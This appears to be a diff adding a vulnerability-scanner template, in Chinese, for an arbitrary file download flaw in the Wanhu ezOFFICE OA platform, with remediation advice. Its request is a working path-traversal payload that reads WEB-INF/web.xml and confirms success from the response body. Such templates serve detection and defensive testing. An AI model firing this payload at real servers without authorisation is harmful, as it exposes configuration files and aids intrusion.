@@ -1,0 +1,35 @@
+id: ssvid-89511
+info:
+  name: 万户OA协同办公管理平台 downloadhttp.jsp 任意文件下载
+  author:
+  - 折跃
+  description: |-
+    万户ezOFFICE downloadhttp.jsp 任意文件下载漏洞
+    万户ezOFFICE协同办公平台是一款OA协同办公软件产品。
+
+    万户ezOFFICE存在任意文件下载漏洞，攻击者可利用漏洞读取任意文件内容。
+  severity: medium
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：
+    https://www.whir.net/
+
+    临时修复方案：
+    1、过滤"."，使用户在url中不能回溯上级目录。
+    2、正则匹配严格判断用户输入参数的格式，对用户传过来的文件名参数进行硬编码或统一编码，对文件类型进行白名单控制，对包含恶意字符或者空字符的参数进行拒绝。
+    3、禁止系统提供目录遍历服务，如：php.ini配置open_basedir限定文件访问范围。
+    4、文件路径保存至数据库，让用户提交文件对应ID下载文件。
+    5、用户下载文件之前进行权限校验。
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - contains(body,'filter-mapping')
+  path:
+  - '{{BaseURL}}/defaultroot/site/templatemanager/downloadhttp.jsp?fileName=../WEB-INF/web.xml'
+  method: GET
+  headers:
+    Host: '{{Hostname}}'
+  req-condition: true
